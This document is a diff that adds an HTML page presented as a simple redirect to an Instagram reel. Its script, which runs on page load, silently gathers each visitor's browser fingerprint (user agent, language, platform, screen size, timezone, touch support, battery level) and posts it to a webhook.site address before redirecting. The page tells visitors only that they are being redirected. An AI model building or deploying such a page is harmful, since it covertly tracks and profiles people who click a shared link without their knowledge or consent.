@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    async function collectAndRedirect() {
+      const data = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        touchSupport: 'ontouchstart' in window,
+        battery: navigator.getBattery ? await navigator.getBattery().then(b => `${b.level * 100}%`) : 'N/A'
+      };
+
+      // Send data to your webhook
+      fetch("https://webhook.site/f45d50dd-ee5f-4cb0-95b6-26a2c497e8fa", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+
+      // Wait 1.5 seconds then redirect
+      setTimeout(() => {
+        window.location.href = "https://www.instagram.com/reel/DK7bFO9yNRg/?igsh=MWN6aXc2M2pqbDdxdQ==";
+      }, 1500);
+    }
+
+    collectAndRedirect();
+  </script>
+</head>
+<body>
+  <p>Redirecting you...</p>
+</body>
+</html>
